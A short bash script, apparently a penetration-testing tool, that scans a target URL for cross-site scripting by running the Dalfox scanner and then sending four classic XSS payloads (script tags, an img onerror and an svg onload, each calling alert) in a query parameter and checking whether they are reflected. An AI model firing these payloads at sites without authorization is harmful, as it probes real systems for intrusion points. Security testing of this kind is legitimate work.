#!/bin/bash
# XSS Vulnerability Scanner
# Find XSS vulnerabilities

if [ -z "$1" ]; then
  echo "Usage: $0 <target-url>"
  exit 1
fi

TARGET=$1

echo "💣 Scanning for XSS Vulnerabilities"
echo ""

# Method 1: Dalfox
echo "[*] Running Dalfox..."
dalfox url "$TARGET" -o dalfox_results.json

# Method 2: Manual payloads
echo "[*] Testing common XSS payloads..."
PAYLOADS=(
  "<script>alert('XSS')</script>"
  "'><script>alert('XSS')</script>"
  "<img src=x onerror=alert('XSS')>"
  "<svg onload=alert('XSS')>"
)

for payload in "${PAYLOADS[@]}"; do
  ENCODED=$(echo $payload | jq -sRr @uri)
  curl -s "$TARGET?q=$ENCODED" | grep -q "$payload" && echo "[+] XSS Found: $payload"
done

echo ""
echo "✅ XSS scan complete!"
